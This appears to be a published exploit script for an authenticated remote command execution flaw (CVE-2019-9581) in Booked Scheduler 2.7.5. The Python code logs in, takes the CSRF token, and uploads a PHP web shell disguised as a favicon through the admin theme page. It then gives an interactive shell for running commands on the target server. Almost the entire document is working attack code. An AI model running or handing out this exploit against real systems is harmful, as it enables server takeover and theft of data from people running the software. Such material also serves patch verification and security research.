# Exploit Title: Booked Scheduler 2.7.5 - Remote Command Execution (RCE) (Authenticated)
# Vulnerability founder: AkkuS
# Date: 13/12/2021
# Exploit Author: 0sunday
# Vendor Homepage: https://www.bookedscheduler.com/
# Software Link: N/A
# Version: Booked Scheduler 2.7.5
# Tester on: Kali 2021.2
# CVE: CVE-2019-9581

#!/usr/bin/python3

import sys
import requests
from random import randint


def login():
	login_payload = {
		"email": username,
		"password": password,
		"login": "submit",
		#"language": "en_us"
	}

	login_req = request.post(
		 target+"/booked/Web/index.php",
		 login_payload,
		 verify=False,
		 allow_redirects=True
	 )

	if login_req.status_code == 200:
		print ("[+] Logged in successfully.")
	else:
		print ("[-] Wrong credentials !")
		exit()


	return login_req.text.split('CSRF_TOKEN" value=')[1].split(";")[0].split('/')[0].split('"')[1]



def upload_shell(csrf):

	boundary = str(randint(123456789012345678901234567890, 999999999999999999999999999999))

	_headers ={ "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
				"Accept-Language": "en-US,en;q=0.5",
				"X-Requested-With": "XMLHttpRequest",
				"Content-Type": "multipart/form-data; boundary=---------------------------"+boundary,
				"Origin": target,
				"Connection": "close",
				"Referer": target + "/booked/Web/admin/manage_theme.php?update"

				}

	data =  "-----------------------------"+boundary+"\r\n"
	data += "Content-Disposition: form-data; name=\"LOGO_FILE\"\r\n\n\n"
	data += "-----------------------------"+boundary+"\r\n"
	data += "Content-Disposition: form-data; name=\"FAVICON_FILE\"; filename=\"simple_shell.php\"\r\n"
	data += "Content-Type: application/x-php\r\n\n"
	data += "<?php $o = system($_REQUEST[\"cmd\"]);die?>\r\n\n"
	data += "-----------------------------"+boundary+"\r\n"
	data += "Content-Disposition: form-data; name=\"CSS_FILE\"\r\n\n\n"
	data += "-----------------------------"+boundary+"\r\n"
	data += "Content-Disposition: form-data; name=\"CSRF_TOKEN\"\r\n\n"
	data += csrf + "\r\n"
	data += "-----------------------------"+boundary+"--\r\n"

	# In case you need some debugging
	_proxies = {
		'http': 'http://127.0.0.1:8080'
	}

	upload_req = request.post(
		 target+"/booked/Web/admin/manage_theme.php?action=update",
		 headers = _headers,
		 data = data
		 #proxies=_proxies
		 )


def shell():
	shell_req = request.get(target+"/booked/Web/custom-favicon.php")

	if shell_req.status_code == 200:

		print("[+] Uploaded shell successfully")
		print("[+] " + target + "/booked/Web/custom-favicon.php?cmd=")
	else:
		print("[-] Shell uploading failed")
		exit(1)

	print()
	cmd = ''
	while(cmd != 'exit'):
		cmd = input("$ ")
		shell_req = request.get(target+"/booked/Web/custom-favicon.php" + '?cmd='+cmd)
		print(shell_req.text)


if len(sys.argv) != 4:
    print ("[+] Usage : "+ sys.argv[0] + " https://target:port username password")
    exit()

target = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]


request = requests.session()

csrf = login()
upload_shell(csrf)
shell()